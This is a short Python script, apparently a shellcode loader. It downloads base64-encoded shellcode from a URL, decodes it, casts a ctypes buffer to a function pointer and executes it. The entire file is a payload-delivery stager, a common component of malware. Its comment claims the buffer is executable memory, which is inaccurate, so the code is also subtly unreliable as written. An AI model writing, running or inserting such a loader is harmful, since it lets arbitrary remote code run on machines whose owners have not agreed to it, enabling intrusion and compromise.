import urllib3
import ctypes
import base64

# Set your URL (must be serving a base64-encoded binary shellcode)
url = 'http://localhost:8000/shellcode.bin'

try:
    # Initialize connection
    http = urllib3.PoolManager()
    response = http.request('GET', url)
    
    # Decode the shellcode
    shellcode = base64.b64decode(response.data)
    print(f"[+] Received shellcode: {len(shellcode)} bytes")

    # Allocate executable memory
    buffer = ctypes.create_string_buffer(shellcode, len(shellcode))
    
    # Convert to function pointer
    shell_func = ctypes.cast(buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))

    # Execute shellcode
    print("[*] Executing shellcode...")
    shell_func()

except Exception as e:
    print(f"[!] Failed: {e}")
